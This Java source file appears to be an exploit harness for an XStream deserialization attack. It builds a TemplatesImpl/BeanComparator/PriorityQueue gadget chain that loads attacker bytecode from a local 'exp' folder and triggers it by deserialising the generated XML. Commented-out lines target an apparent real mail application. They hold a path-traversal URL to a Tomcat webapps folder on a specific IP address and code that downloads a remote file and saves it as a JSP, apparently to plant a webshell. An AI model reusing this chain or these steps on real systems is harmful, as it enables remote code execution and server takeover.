package com.mechoy;

//import com.funch.messageSubmitted.inter.vo.MailVo;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.HierarchicalStreamReader;
import com.thoughtworks.xstream.io.xml.DomDriver;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.util.*;

public class XStreamTest1 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes()};
        bytecodes.set(templates,b);


        // 创建序列化对象
        Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator com = (Comparator<?>) constructor.newInstance();

        BeanComparator comparator = new BeanComparator("outputProperties",com);
        PriorityQueue<Object> queue = new PriorityQueue<>(2,comparator);

        Field queues = queue.getClass().getDeclaredField("queue");
        queues.setAccessible(true);
        Object[] queueArray = (Object[])queues.get(queue);
        queueArray[0] = templates;
        queueArray[1] = null;

        Field size = queue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);

        String xml = new XStream(new DomDriver()).toXML(queue);

        System.out.println(xml);

        Object o = new XStream().fromXML(xml);

//        Utils.serialize(hashMap);
//        Utils.deserialize();


//        Person person = new Person();
//        person.setName("aaa");
//        person.setCmd("bbb");

//        System.out.println(getEnd("http://45.152.64.97:8000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fdata%2ffunch%2fwebServer%2ftomcat%2fwebapps%2ffcms%2f11.txt"));
//        System.out.println(URLDecoder.decode(getEnd("http://45.152.64.97:8000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fdata%2ffunch%2fwebServer%2ftomcat%2fwebapps%2ffcms%2f11.txt"),"UTF-8"));




//        AttachmentVo attachmentVo = new AttachmentVo();
//        attachmentVo.setFilePath("http://45.152.64.97:8000/1.txt");
//        attachmentVo.setFileType(0);
//        attachmentVo.setFileName("1.jpg");

//        ArrayList<AttachmentVo> attachmentVos = new ArrayList<>();
//        attachmentVos.add(attachmentVo);


//        MailVo mailVo = new MailVo();
//        mailVo.setPicPath("http://45.152.64.97:8000/1.jpg");
//        mailVo.setContent("111");
//        mailVo.setAuthor("222");
//        mailVo.setContent("333");
//        mailVo.setAttachmentList(attachmentVos);


//        XStream xs = new XStream(new DomDriver());
//        MailVo o = (MailVo) xs.fromXML();
//        AttachmentVo o1 = (AttachmentVo)o.getAttachmentList().get(0);
//        System.out.println(o1.getFilePath());
//        System.out.println(o);\

//        byte[] buf = new byte[1024];
//        URL url = new URL(o1.getFilePath());
//        HttpURLConnection httpUrl = (HttpURLConnection) url.openConnection();
//        httpUrl.connect();
//        BufferedInputStream bis = new BufferedInputStream(httpUrl.getInputStream());
//        FileOutputStream fos = new FileOutputStream("css.jsp");
//        while (true) {
//            int size = bis.read(buf);
//            if (size != -1) {
//                fos.write(buf, 0, size);
//            } else {
//                fos.close();
//                bis.close();
//                httpUrl.disconnect();
//                return;
//            }
//        }
    }

    public static String getEnd(String url) {
        if (url != null) {
            if (url.indexOf("\\") > -1) {
                url = url.replaceAll("\\\\", "/");
            }
            if (url.indexOf("//") > -1) {
                url = url.replaceAll("//", "/");
            }
            String[] str = url.split("/");
            return str[str.length - 1];
        }
        return null;
    }

    public static byte[] classBytes() throws IOException {
        FileInputStream fis = new FileInputStream("D:\\Tools\\exp\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(classBytes));
        return classBytes;
    }
}
